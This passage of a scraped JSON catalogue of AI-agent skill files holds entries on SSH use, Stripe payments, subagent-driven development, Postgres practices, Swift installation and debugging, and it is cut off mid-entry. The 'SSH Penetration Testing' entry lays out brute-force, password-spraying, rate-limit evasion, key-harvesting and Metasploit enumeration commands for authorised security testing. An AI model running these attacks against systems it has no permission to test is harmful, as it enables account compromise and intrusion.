/path/to/local/file username@hostname:/path/to/remote/directory/\n```\n\nCopy a file from the remote server:\n```bash\nscp username@hostname:/path/to/remote/file /path/to/local/directory/\n```\n\nCopy a directory recursively:\n```bash\nscp -r /path/to/local/directory username@hostname:/path/to/remote/directory/\n```\n\n## SSH Agent\n\nStart the SSH agent:\n```bash\neval \"$(ssh-agent -s)\"\n```\n\nAdd a key to the agent:\n```bash\nssh-add ~/.ssh/key_name\n```\n\n## Troubleshooting\n\n- Check SSH service status on remote: `systemctl status sshd`\n- Verify SSH port is open: `nc -zv hostname 22`\n- Debug connection issues: `ssh -vvv username@hostname`\n- Check permissions: SSH private keys should have 600 permissions (`chmod 600 ~/.ssh/key_name`)\n- Verify known_hosts: If host key changed, remove the old entry with `ssh-keygen -R hostname`\n\n## Secure SSH Key Management\n\n### Local Storage with Proper Permissions\n\nThe most basic approach is to ensure proper file permissions:\n\n```bash\n# Set correct permissions for private keys\nchmod 600 ~/.ssh/id_ed25519\n# Set correct permissions for public keys\nchmod 644 ~/.ssh/id_ed25519.pub\n# Set correct permissions for SSH directory\nchmod 700 ~/.ssh\n```\n",
      "tags": [
        "bash",
        "shell",
        "pr",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:32.352Z"
    },
    {
      "id": "antigravity-ssh-penetration-testing",
      "name": "SSH Penetration Testing",
      "slug": "ssh-penetration-testing",
      "description": "This skill should be used when the user asks to \"pentest SSH services\", \"enumerate SSH configurations\", \"brute force SSH credentials\", \"exploit SSH vulnerabilities\", \"perform SSH tunneling\", or \"audit SSH security\". It provides comprehensive SSH penetration testing methodologies and techniques.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/ssh-penetration-testing",
      "content": "\n# SSH Penetration Testing\n\n## Purpose\n\nConduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.\n\n## Prerequisites\n\n### Required Tools\n- Nmap with SSH scripts\n- Hydra or Medusa for brute-forcing\n- ssh-audit for configuration analysis\n- Metasploit Framework\n- Python with Paramiko library\n\n### Required Knowledge\n- SSH protocol fundamentals\n- Public/private key authentication\n- Port forwarding concepts\n- Linux command-line proficiency\n\n## Outputs and Deliverables\n\n1. **SSH Enumeration Report** - Versions, algorithms, configurations\n2. **Credential Assessment** - Weak passwords, default credentials\n3. **Vulnerability Assessment** - Known CVEs, misconfigurations\n4. **Tunnel Documentation** - Port forwarding configurations\n\n## Core Workflow\n\n### Phase 1: SSH Service Discovery\n\nIdentify SSH services on target networks:\n\n```bash\n# Quick SSH port scan\nnmap -p 22 192.168.1.0/24 --open\n\n# Common alternate SSH ports\nnmap -p 22,2222,22222,2200 192.168.1.100\n\n# Full port scan for SSH\nnmap -p- --open 192.168.1.100 | grep -i ssh\n\n# Service version detection\nnmap -sV -p 22 192.168.1.100\n```\n\n### Phase 2: SSH Enumeration\n\nGather detailed information about SSH services:\n\n```bash\n# Banner grabbing\nnc 192.168.1.100 22\n# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5\n\n# Telnet banner grab\ntelnet 192.168.1.100 22\n\n# Nmap version detection with scripts\nnmap -sV -p 22 --script ssh-hostkey 192.168.1.100\n\n# Enumerate supported algorithms\nnmap -p 22 --script ssh2-enum-algos 192.168.1.100\n\n# Get host keys\nnmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100\n\n# Check authentication methods\nnmap -p 22 --script ssh-auth-methods --script-args=\"ssh.user=root\" 192.168.1.100\n```\n\n### Phase 3: SSH Configuration Auditing\n\nIdentify weak configurations:\n\n```bash\n# ssh-audit - comprehensive SSH audit\nssh-audit 192.168.1.100\n\n# ssh-audit with specific port\nssh-audit -p 2222 192.168.1.100\n\n# Output includes:\n# - Algorithm recommendations\n# - Security vulnerabilities\n# - Hardening suggestions\n```\n\nKey configuration weaknesses to identify:\n- Weak key exchange algorithms (diffie-hellman-group1-sha1)\n- Weak ciphers (arcfour, 3des-cbc)\n- Weak MACs (hmac-md5, hmac-sha1-96)\n- Deprecated protocol versions\n\n### Phase 4: Credential Attacks\n\n#### Brute-Force with Hydra\n\n```bash\n# Single username, password list\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n\n# Username list, single password\nhydra -L users.txt -p Password123 ssh://192.168.1.100\n\n# Username and password lists\nhydra -L users.txt -P passwords.txt ssh://192.168.1.100\n\n# With specific port\nhydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100\n\n# Rate limiting evasion (slow)\nhydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100\n\n# Verbose output\nhydra -l admin -P passwords.txt -vV ssh://192.168.1.100\n\n# Exit on first success\nhydra -l admin -P passwords.txt -f ssh://192.168.1.100\n```\n\n#### Brute-Force with Medusa\n\n```bash\n# Basic brute-force\nmedusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh\n\n# Multiple targets\nmedusa -H targets.txt -u admin -P passwords.txt -M ssh\n\n# With username list\nmedusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh\n\n# Specific port\nmedusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222\n```\n\n#### Password Spraying\n\n```bash\n# Test common password across users\nhydra -L users.txt -p Summer2024! ssh://192.168.1.100\n\n# Multiple common passwords\nfor pass in \"Password123\" \"Welcome1\" \"Summer2024!\"; do\n    hydra -L users.txt -p \"$pass\" ssh://192.168.1.100\ndone\n```\n\n### Phase 5: Key-Based Authentication Testing\n\nTest for weak or exposed keys:\n\n```bash\n# Attempt login with found private key\nssh -i id_rsa user@192.168.1.100\n\n# Specify key explicitly (bypass agent)\nssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100\n\n# Force password authentication\nssh -o PreferredAuthentications=password user@192.168.1.100\n\n# Try common key names\nfor key in id_rsa id_dsa id_ecdsa id_ed25519; do\n    ssh -i \"$key\" user@192.168.1.100\ndone\n```\n\nCheck for exposed keys:\n\n```bash\n# Common locations for private keys\n~/.ssh/id_rsa\n~/.ssh/id_dsa\n~/.ssh/id_ecdsa\n~/.ssh/id_ed25519\n/etc/ssh/ssh_host_*_key\n/root/.ssh/\n/home/*/.ssh/\n\n# Web-accessible keys (check with curl/wget)\ncurl -s http://target.com/.ssh/id_rsa\ncurl -s http://target.com/id_rsa\ncurl -s http://target.com/backup/ssh_keys.tar.gz\n```\n\n### Phase 6: Vulnerability Exploitation\n\nSearch for known vulnerabilities:\n\n```bash\n# Search for exploits\nsearchsploit openssh\nsearchsploit openssh 7.2\n\n# Common SSH vulnerabilities\n# CVE-2018-15473 - Username enumeration\n# CVE-2016-0777 - Roaming vulnerability\n# CVE-2016-0778 - Buffer overflow\n\n# Metasploit enumeration\nmsfconsole\nuse auxiliary/scanner/ssh/ssh_version\nset RHOSTS 192.168.1.100\nrun\n\n# Username enumeration (CVE-2018-15473)\nuse auxiliary/scanne",
      "tags": [
        "python",
        "ai",
        "agent",
        "llm",
        "automation",
        "workflow",
        "document",
        "security",
        "pentest",
        "vulnerability"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:58.446Z"
    },
    {
      "id": "antigravity-stripe-integration",
      "name": "stripe-integration",
      "slug": "stripe-integration",
      "description": "Get paid from day one. Payments, subscriptions, billing portal, webhooks, metered billing, Stripe Connect. The complete guide to implementing Stripe correctly, including all the edge cases that will bite you at 3am.  This isn't just API calls - it's the full payment system: handling failures, managi",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/stripe-integration",
      "content": "\n# Stripe Integration\n\nYou are a payments engineer who has processed billions in transactions.\nYou've seen every edge case - declined cards, webhook failures, subscription\nnightmares, currency issues, refund fraud. You know that payments code must\nbe bulletproof because errors cost real money. You're paranoid about race\nconditions, idempotency, and webhook verification.\n\n## Capabilities\n\n- stripe-payments\n- subscription-management\n- billing-portal\n- stripe-webhooks\n- checkout-sessions\n- payment-intents\n- stripe-connect\n- metered-billing\n- dunning-management\n- payment-failure-handling\n\n## Requirements\n\n- supabase-backend\n\n## Patterns\n\n### Idempotency Key Everything\n\nUse idempotency keys on all payment operations to prevent duplicate charges\n\n### Webhook State Machine\n\nHandle webhooks as state transitions, not triggers\n\n### Test Mode Throughout Development\n\nUse Stripe test mode with real test cards for all development\n\n## Anti-Patterns\n\n### ❌ Trust the API Response\n\n### ❌ Webhook Without Signature Verification\n\n### ❌ Subscription Status Checks Without Refresh\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Not verifying webhook signatures | critical | # Always verify signatures: |\n| JSON middleware parsing body before webhook can verify | critical | # Next.js App Router: |\n| Not using idempotency keys for payment operations | high | # Always use idempotency keys: |\n| Trusting API responses instead of webhooks for payment statu | critical | # Webhook-first architecture: |\n| Not passing metadata through checkout session | high | # Always include metadata: |\n| Local subscription state drifting from Stripe state | high | # Handle ALL subscription webhooks: |\n| Not handling failed payments and dunning | high | # Handle invoice.payment_failed: |\n| Different code paths or behavior between test and live mode | high | # Separate all keys: |\n\n## Related Skills\n\nWorks well with: `nextjs-supabase-auth`, `supabase-backend`, `webhook-patterns`, `security`\n",
      "tags": [
        "nextjs",
        "api",
        "ai",
        "security",
        "supabase",
        "stripe"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:59.668Z"
    },
    {
      "id": "superpowers-subagent-driven-development",
      "name": "subagent-driven-development",
      "slug": "superpowers-subagent-driven-development",
      "description": "Use when executing implementation plans with independent tasks in the current session",
      "category": "AI & Agents",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/subagent-driven-development",
      "content": "\n# Subagent-Driven Development\n\nExecute plan by dispatching fresh subagent per task, with two-stage review after each: spec compliance review first, then code quality review.\n\n**Core principle:** Fresh subagent per task + two-stage review (spec then quality) = high quality, fast iteration\n\n## When to Use\n\n```dot\ndigraph when_to_use {\n    \"Have implementation plan?\" [shape=diamond];\n    \"Tasks mostly independent?\" [shape=diamond];\n    \"Stay in this session?\" [shape=diamond];\n    \"subagent-driven-development\" [shape=box];\n    \"executing-plans\" [shape=box];\n    \"Manual execution or brainstorm first\" [shape=box];\n\n    \"Have implementation plan?\" -> \"Tasks mostly independent?\" [label=\"yes\"];\n    \"Have implementation plan?\" -> \"Manual execution or brainstorm first\" [label=\"no\"];\n    \"Tasks mostly independent?\" -> \"Stay in this session?\" [label=\"yes\"];\n    \"Tasks mostly independent?\" -> \"Manual execution or brainstorm first\" [label=\"no - tightly coupled\"];\n    \"Stay in this session?\" -> \"subagent-driven-development\" [label=\"yes\"];\n    \"Stay in this session?\" -> \"executing-plans\" [label=\"no - parallel session\"];\n}\n```\n\n**vs. Executing Plans (parallel session):**\n- Same session (no context switch)\n- Fresh subagent per task (no context pollution)\n- Two-stage review after each task: spec compliance first, then code quality\n- Faster iteration (no human-in-loop between tasks)\n\n## The Process\n\n```dot\ndigraph process {\n    rankdir=TB;\n\n    subgraph cluster_per_task {\n        label=\"Per Task\";\n        \"Dispatch implementer subagent (./implementer-prompt.md)\" [shape=box];\n        \"Implementer subagent asks questions?\" [shape=diamond];\n        \"Answer questions, provide context\" [shape=box];\n        \"Implementer subagent implements, tests, commits, self-reviews\" [shape=box];\n        \"Dispatch spec reviewer subagent (./spec-reviewer-prompt.md)\" [shape=box];\n        \"Spec reviewer subagent confirms code matches spec?\" [shape=diamond];\n        \"Implementer subagent fixes spec gaps\" [shape=box];\n        \"Dispatch code quality reviewer subagent (./code-quality-reviewer-prompt.md)\" [shape=box];\n        \"Code quality reviewer subagent approves?\" [shape=diamond];\n        \"Implementer subagent fixes quality issues\" [shape=box];\n        \"Mark task complete in TodoWrite\" [shape=box];\n    }\n\n    \"Read plan, extract all tasks with full text, note context, create TodoWrite\" [shape=box];\n    \"More tasks remain?\" [shape=diamond];\n    \"Dispatch final code reviewer subagent for entire implementation\" [shape=box];\n    \"Use superpowers:finishing-a-development-branch\" [shape=box style=filled fillcolor=lightgreen];\n\n    \"Read plan, extract all tasks with full text, note context, create TodoWrite\" -> \"Dispatch implementer subagent (./implementer-prompt.md)\";\n    \"Dispatch implementer subagent (./implementer-prompt.md)\" -> \"Implementer subagent asks questions?\";\n    \"Implementer subagent asks questions?\" -> \"Answer questions, provide context\" [label=\"yes\"];\n    \"Answer questions, provide context\" -> \"Dispatch implementer subagent (./implementer-prompt.md)\";\n    \"Implementer subagent asks questions?\" -> \"Implementer subagent implements, tests, commits, self-reviews\" [label=\"no\"];\n    \"Implementer subagent implements, tests, commits, self-reviews\" -> \"Dispatch spec reviewer subagent (./spec-reviewer-prompt.md)\";\n    \"Dispatch spec reviewer subagent (./spec-reviewer-prompt.md)\" -> \"Spec reviewer subagent confirms code matches spec?\";\n    \"Spec reviewer subagent confirms code matches spec?\" -> \"Implementer subagent fixes spec gaps\" [label=\"no\"];\n    \"Implementer subagent fixes spec gaps\" -> \"Dispatch spec reviewer subagent (./spec-reviewer-prompt.md)\" [label=\"re-review\"];\n    \"Spec reviewer subagent confirms code matches spec?\" -> \"Dispatch code quality reviewer subagent (./code-quality-reviewer-prompt.md)\" [label=\"yes\"];\n    \"Dispatch code quality reviewer subagent (./code-quality-reviewer-prompt.md)\" -> \"Code quality reviewer subagent approves?\";\n    \"Code quality reviewer subagent approves?\" -> \"Implementer subagent fixes quality issues\" [label=\"no\"];\n    \"Implementer subagent fixes quality issues\" -> \"Dispatch code quality reviewer subagent (./code-quality-reviewer-prompt.md)\" [label=\"re-review\"];\n    \"Code quality reviewer subagent approves?\" -> \"Mark task complete in TodoWrite\" [label=\"yes\"];\n    \"Mark task complete in TodoWrite\" -> \"More tasks remain?\";\n    \"More tasks remain?\" -> \"Dispatch implementer subagent (./implementer-prompt.md)\" [label=\"yes\"];\n    \"More tasks remain?\" -> \"Dispatch final code reviewer subagent for entire implementation\" [label=\"no\"];\n    \"Dispatch final code reviewer subagent for entire implementation\" -> \"Use superpowers:finishing-a-development-branch\";\n}\n```\n\n## Prompt Templates\n\n- `./implementer-prompt.md` - Dispatch implementer subagent\n- `./spec-reviewer-prompt.md` - Dispatch spec compliance reviewer subagent\n- `./code-quality-reviewer-prompt.md` - Dispatch code quality reviewer subagent\n\n## Example Workflow\n\n```\nYo",
      "tags": [
        "tdd",
        "debug",
        "debugging",
        "git",
        "code-review",
        "subagent",
        "workflow",
        "agent",
        "driven",
        "development"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:17.886Z"
    },
    {
      "id": "antigravity-subagent-driven-development",
      "name": "subagent-driven-development",
      "slug": "subagent-driven-development",
      "description": "Use when executing implementation plans with independent tasks in the current session",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/subagent-driven-development",
      "content": "\n# Subagent-Driven Development\n\nExecute plan by dispatching fresh subagent per task, with two-stage review after each: spec compliance review first, then code quality review.\n\n**Core principle:** Fresh subagent per task + two-stage review (spec then quality) = high quality, fast iteration\n\n## When to Use\n\n```dot\ndigraph when_to_use {\n    \"Have implementation plan?\" [shape=diamond];\n    \"Tasks mostly independent?\" [shape=diamond];\n    \"Stay in this session?\" [shape=diamond];\n    \"subagent-driven-development\" [shape=box];\n    \"executing-plans\" [shape=box];\n    \"Manual execution or brainstorm first\" [shape=box];\n\n    \"Have implementation plan?\" -> \"Tasks mostly independent?\" [label=\"yes\"];\n    \"Have implementation plan?\" -> \"Manual execution or brainstorm first\" [label=\"no\"];\n    \"Tasks mostly independent?\" -> \"Stay in this session?\" [label=\"yes\"];\n    \"Tasks mostly independent?\" -> \"Manual execution or brainstorm first\" [label=\"no - tightly coupled\"];\n    \"Stay in this session?\" -> \"subagent-driven-development\" [label=\"yes\"];\n    \"Stay in this session?\" -> \"executing-plans\" [label=\"no - parallel session\"];\n}\n```\n\n**vs. Executing Plans (parallel session):**\n- Same session (no context switch)\n- Fresh subagent per task (no context pollution)\n- Two-stage review after each task: spec compliance first, then code quality\n- Faster iteration (no human-in-loop between tasks)\n\n## The Process\n\n```dot\ndigraph process {\n    rankdir=TB;\n\n    subgraph cluster_per_task {\n        label=\"Per Task\";\n        \"Dispatch implementer subagent (./implementer-prompt.md)\" [shape=box];\n        \"Implementer subagent asks questions?\" [shape=diamond];\n        \"Answer questions, provide context\" [shape=box];\n        \"Implementer subagent implements, tests, commits, self-reviews\" [shape=box];\n        \"Dispatch spec reviewer subagent (./spec-reviewer-prompt.md)\" [shape=box];\n        \"Spec reviewer subagent confirms code matches spec?\" [shape=diamond];\n        \"Implementer subagent fixes spec gaps\" [shape=box];\n        \"Dispatch code quality reviewer subagent (./code-quality-reviewer-prompt.md)\" [shape=box];\n        \"Code quality reviewer subagent approves?\" [shape=diamond];\n        \"Implementer subagent fixes quality issues\" [shape=box];\n        \"Mark task complete in TodoWrite\" [shape=box];\n    }\n\n    \"Read plan, extract all tasks with full text, note context, create TodoWrite\" [shape=box];\n    \"More tasks remain?\" [shape=diamond];\n    \"Dispatch final code reviewer subagent for entire implementation\" [shape=box];\n    \"Use superpowers:finishing-a-development-branch\" [shape=box style=filled fillcolor=lightgreen];\n\n    \"Read plan, extract all tasks with full text, note context, create TodoWrite\" -> \"Dispatch implementer subagent (./implementer-prompt.md)\";\n    \"Dispatch implementer subagent (./implementer-prompt.md)\" -> \"Implementer subagent asks questions?\";\n    \"Implementer subagent asks questions?\" -> \"Answer questions, provide context\" [label=\"yes\"];\n    \"Answer questions, provide context\" -> \"Dispatch implementer subagent (./implementer-prompt.md)\";\n    \"Implementer subagent asks questions?\" -> \"Implementer subagent implements, tests, commits, self-reviews\" [label=\"no\"];\n    \"Implementer subagent implements, tests, commits, self-reviews\" -> \"Dispatch spec reviewer subagent (./spec-reviewer-prompt.md)\";\n    \"Dispatch spec reviewer subagent (./spec-reviewer-prompt.md)\" -> \"Spec reviewer subagent confirms code matches spec?\";\n    \"Spec reviewer subagent confirms code matches spec?\" -> \"Implementer subagent fixes spec gaps\" [label=\"no\"];\n    \"Implementer subagent fixes spec gaps\" -> \"Dispatch spec reviewer subagent (./spec-reviewer-prompt.md)\" [label=\"re-review\"];\n    \"Spec reviewer subagent confirms code matches spec?\" -> \"Dispatch code quality reviewer subagent (./code-quality-reviewer-prompt.md)\" [label=\"yes\"];\n    \"Dispatch code quality reviewer subagent (./code-quality-reviewer-prompt.md)\" -> \"Code quality reviewer subagent approves?\";\n    \"Code quality reviewer subagent approves?\" -> \"Implementer subagent fixes quality issues\" [label=\"no\"];\n    \"Implementer subagent fixes quality issues\" -> \"Dispatch code quality reviewer subagent (./code-quality-reviewer-prompt.md)\" [label=\"re-review\"];\n    \"Code quality reviewer subagent approves?\" -> \"Mark task complete in TodoWrite\" [label=\"yes\"];\n    \"Mark task complete in TodoWrite\" -> \"More tasks remain?\";\n    \"More tasks remain?\" -> \"Dispatch implementer subagent (./implementer-prompt.md)\" [label=\"yes\"];\n    \"More tasks remain?\" -> \"Dispatch final code reviewer subagent for entire implementation\" [label=\"no\"];\n    \"Dispatch final code reviewer subagent for entire implementation\" -> \"Use superpowers:finishing-a-development-branch\";\n}\n```\n\n## Prompt Templates\n\n- `./implementer-prompt.md` - Dispatch implementer subagent\n- `./spec-reviewer-prompt.md` - Dispatch spec compliance reviewer subagent\n- `./code-quality-reviewer-prompt.md` - Dispatch code quality reviewer subagent\n\n## Example Workflow\n\n```\nYo",
      "tags": [
        "ai",
        "agent",
        "workflow",
        "template",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:00.878Z"
    },
    {
      "id": "antigravity-postgres-best-practices",
      "name": "supabase-postgres-best-practices",
      "slug": "postgres-best-practices",
      "description": "Postgres performance optimization and best practices from Supabase. Use this skill when writing, reviewing, or optimizing Postgres queries, schema designs, or database configurations.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/postgres-best-practices",
      "content": "\n# Supabase Postgres Best Practices\n\nComprehensive performance optimization guide for Postgres, maintained by Supabase. Contains rules across 8 categories, prioritized by impact to guide automated query optimization and schema design.\n\n## When to Apply\n\nReference these guidelines when:\n- Writing SQL queries or designing schemas\n- Implementing indexes or query optimization\n- Reviewing database performance issues\n- Configuring connection pooling or scaling\n- Optimizing for Postgres-specific features\n- Working with Row-Level Security (RLS)\n\n## Rule Categories by Priority\n\n| Priority | Category | Impact | Prefix |\n|----------|----------|--------|--------|\n| 1 | Query Performance | CRITICAL | `query-` |\n| 2 | Connection Management | CRITICAL | `conn-` |\n| 3 | Security & RLS | CRITICAL | `security-` |\n| 4 | Schema Design | HIGH | `schema-` |\n| 5 | Concurrency & Locking | MEDIUM-HIGH | `lock-` |\n| 6 | Data Access Patterns | MEDIUM | `data-` |\n| 7 | Monitoring & Diagnostics | LOW-MEDIUM | `monitor-` |\n| 8 | Advanced Features | LOW | `advanced-` |\n\n## How to Use\n\nRead individual rule files for detailed explanations and SQL examples:\n\n```\nrules/query-missing-indexes.md\nrules/schema-partial-indexes.md\nrules/_sections.md\n```\n\nEach rule file contains:\n- Brief explanation of why it matters\n- Incorrect SQL example with explanation\n- Correct SQL example with explanation\n- Optional EXPLAIN output or metrics\n- Additional context and references\n- Supabase-specific notes (when applicable)\n\n## Full Compiled Document\n\nFor the complete guide with all rules expanded: `AGENTS.md`\n",
      "tags": [
        "ai",
        "agent",
        "design",
        "document",
        "security",
        "supabase",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:26.365Z"
    },
    {
      "id": "openhands-swift-linux",
      "name": "swift-linux",
      "slug": "swift-linux",
      "description": "This document provides instructions for installing Swift on Debian 12 (Bookworm).",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/swift-linux.md",
      "content": "\n# Swift Installation Guide for Debian Linux\n\nThis document provides instructions for installing Swift on Debian 12 (Bookworm).\n\n> This setup is intended for non-UI development tasks on Swift on Linux.\n\n## Prerequisites\n\nBefore installing Swift, you need to install the required dependencies for your system. You can find the most up-to-date list of dependencies for your specific Linux distribution and version at the [Swift.org tarball installation guide](https://www.swift.org/install/linux/tarball/).\n\nFOR EXAMPLE, the dependencies you may need to install for Debian 12 could be:\n\n```bash\nsudo apt-get update\nsudo apt-get install -y \\\n  binutils-gold \\\n  gcc \\\n  git \\\n  libcurl4-openssl-dev \\\n  libedit-dev \\\n  libicu-dev \\\n  libncurses-dev \\\n  libpython3-dev \\\n  libsqlite3-dev \\\n  libxml2-dev \\\n  pkg-config \\\n  tzdata \\\n  uuid-dev\n```\n\n## Download and Install Swift\n\n1. Find the latest Swift version for Debian:\n\n   Go to the [Swift.org download page](https://www.swift.org/download/) to find the latest Swift version compatible with Debian 12 (Bookworm).\n\n   Look for a tarball named something like `swift-<VERSION>-RELEASE-debian12.tar.gz` (e.g., `swift-6.0.3-RELEASE-debian12.tar.gz`).\n\n   The URL pattern is typically:\n   ```\n   https://download.swift.org/swift-<VERSION>-release/debian12/swift-<VERSION>-RELEASE/swift-<VERSION>-RELEASE-debian12.tar.gz\n   ```\n\n   Where `<VERSION>` is the Swift version number (e.g., `6.0.3`).\n\n2. Download the Swift binary for Debian 12:\n\n```bash\ncd /workspace\nwget https://download.swift.org/swift-6.0.3-release/debian12/swift-6.0.3-RELEASE/swift-6.0.3-RELEASE-debian12.tar.gz\n```\n\n3. Extract the archive:\n\n> **Note**: Make sure to install Swift in the `/workspace` directory, but outside the git repository to avoid committing the Swift binaries.\n\n4. Add Swift to your PATH by adding the following line to your `~/.bashrc` file:\n\n```bash\necho 'export PATH=/workspace/swift-6.0.3-RELEASE-debian12/usr/bin:$PATH' >> ~/.bashrc\nsource ~/.bashrc\n```\n\n> **Note**: Make sure to update the version number in the PATH to match the version you downloaded.\n\n## Verify Installation\n\nVerify that Swift is correctly installed by running:\n\n```bash\nswift --version\n```\n",
      "tags": [
        "git",
        "python",
        "bash",
        "linux",
        "pr",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:32.641Z"
    },
    {
      "id": "superpowers-systematic-debugging",
      "name": "systematic-debugging",
      "slug": "superpowers-systematic-debugging",
      "description": "Use when encountering any bug, test failure, or unexpected behavior, before proposing fixes",
      "category": "Development & Code Tools",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/systematic-debugging",
      "content": "\n# Systematic Debugging\n\n## Overview\n\nRandom fixes waste time and create new bugs. Quick patches mask underlying issues.\n\n**Core principle:** ALWAYS find root cause before attempting fixes. Symptom fixes are failure.\n\n**Violating the letter of this process is violating the spirit of debugging.**\n\n## The Iron Law\n\n```\nNO FIXES WITHOUT ROOT CAUSE INVESTIGATION FIRST\n```\n\nIf you haven't completed Phase 1, you cannot propose fixes.\n\n## When to Use\n\nUse for ANY technical issue:\n- Test failures\n- Bugs in production\n- Unexpected behavior\n- Performance problems\n- Build failures\n- Integration issues\n\n**Use this ESPECIALLY when:**\n- Under time pressure (emergencies make guessing tempting)\n- \"Just one quick fix\" seems obvious\n- You've already tried multiple fixes\n- Previous fix didn't work\n- You don't fully understand the issue\n\n**Don't skip when:**\n- Issue seems simple (simple bugs have root causes too)\n- You're in a hurry (rushing guarantees rework)\n- Manager wants it fixed NOW (systematic is faster than thrashing)\n\n## The Four Phases\n\nYou MUST complete each phase before proceeding to the next.\n\n### Phase 1: Root Cause Investigation\n\n**BEFORE attempting ANY fix:**\n\n1. **Read Error Messages Carefully**\n   - Don't skip past errors or warnings\n   - They often contain the exact solution\n   - Read stack traces completely\n   - Note line numbers, file paths, error codes\n\n2. **Reproduce Consistently**\n   - Can you trigger it reliably?\n   - What are the exact steps?\n   - Does it happen every time?\n   - If not reproducible → gather more data, don't guess\n\n3. **Check Recent Changes**\n   - What changed that could cause this?\n   - Git diff, recent commits\n   - New dependencies, config changes\n   - Environmental differences\n\n4. **Gather Evidence in Multi-Component Systems**\n\n   **WHEN system has multiple components (CI → build → signing, API → service → database):**\n\n   **BEFORE proposing fixes, add diagnostic instrumentation:**\n   ```\n   For EACH component boundary:\n     - Log what data enters component\n     - Log what data exits component\n     - Verify environment/config propagation\n     - Check state at each layer\n\n   Run once to gather evidence showing WHERE it breaks\n   THEN analyze evidence to identify failing component\n   THEN investigate that specific component\n   ```\n\n   **Example (multi-layer system):**\n   ```bash\n   # Layer 1: Workflow\n   echo \"=== Secrets available in workflow: ===\"\n   echo \"IDENTITY: ${IDENTITY:+SET}${IDENTITY:-UNSET}\"\n\n   # Layer 2: Build script\n   echo \"=== Env vars in build script: ===\"\n   env | grep IDENTITY || echo \"IDENTITY not in environment\"\n\n   # Layer 3: Signing script\n   echo \"=== Keychain state: ===\"\n   security list-keychains\n   security find-identity -v\n\n   # Layer 4: Actual signing\n   codesign --sign \"$IDENTITY\" --verbose=4 \"$APP\"\n   ```\n\n   **This reveals:** Which layer fails (secrets → workflow ✓, workflow → build ✗)\n\n5. **Trace Data Flow**\n\n   **WHEN error is deep in call stack:**\n\n   See `root-cause-tracing.md` in this directory for the complete backward tracing technique.\n\n   **Quick version:**\n   - Where does bad value originate?\n   - What called this with bad value?\n   - Keep tracing up until you find the source\n   - Fix at source, not at symptom\n\n### Phase 2: Pattern Analysis\n\n**Find the pattern before fixing:**\n\n1. **Find Working Examples**\n   - Locate similar working code in same codebase\n   - What works that's similar to what's broken?\n\n2. **Compare Against References**\n   - If implementing pattern, read reference implementation COMPLETELY\n   - Don't skim - read every line\n   - Understand the pattern fully before applying\n\n3. **Identify Differences**\n   - What's different between working and broken?\n   - List every difference, however small\n   - Don't assume \"that can't matter\"\n\n4. **Understand Dependencies**\n   - What other components does this need?\n   - What settings, config, environment?\n   - What assumptions does it make?\n\n### Phase 3: Hypothesis and Testing\n\n**Scientific method:**\n\n1. **Form Single Hypothesis**\n   - State clearly: \"I think X is the root cause because Y\"\n   - Write it down\n   - Be specific, not vague\n\n2. **Test Minimally**\n   - Make the SMALLEST possible change to test hypothesis\n   - One variable at a time\n   - Don't fix multiple things at once\n\n3. **Verify Before Continuing**\n   - Did it work? Yes → Phase 4\n   - Didn't work? Form NEW hypothesis\n   - DON'T add more fixes on top\n\n4. **When You Don't Know**\n   - Say \"I don't understand X\"\n   - Don't pretend to know\n   - Ask for help\n   - Research more\n\n### Phase 4: Implementation\n\n**Fix the root cause, not the symptom:**\n\n1. **Create Failing Test Case**\n   - Simplest possible reproduction\n   - Automated test if possible\n   - One-off test script if no framework\n   - MUST have before fixing\n   - Use the `superpowers:test-driven-development` skill for writing proper failing tests\n\n2. **Implement Single Fix**\n   - Address the root cause identified\n   - ONE change at a time\n   - No \"while I'm here\" improvemen",
      "tags": [
        "testing",
        "debug",
        "debugging",
        "git",
        "workflow",
        "verification",
        "systematic"
      ],
      "useCases": [
        "Test failures",
        "Bugs in production",
        "Unexpected behavior",
        "Performance problems",
        "Build failures"
      ],
      "scrapedAt": "2026-01-26T13:14:19.089Z"
    },
    {
      "id": "antigravity-systematic-debugging",
      "name": "systematic-debugging",
      "slug": "systematic-debugging",
      "description": "Use when encountering any bug, test failure, or unexpected behavior, before proposing fixes",
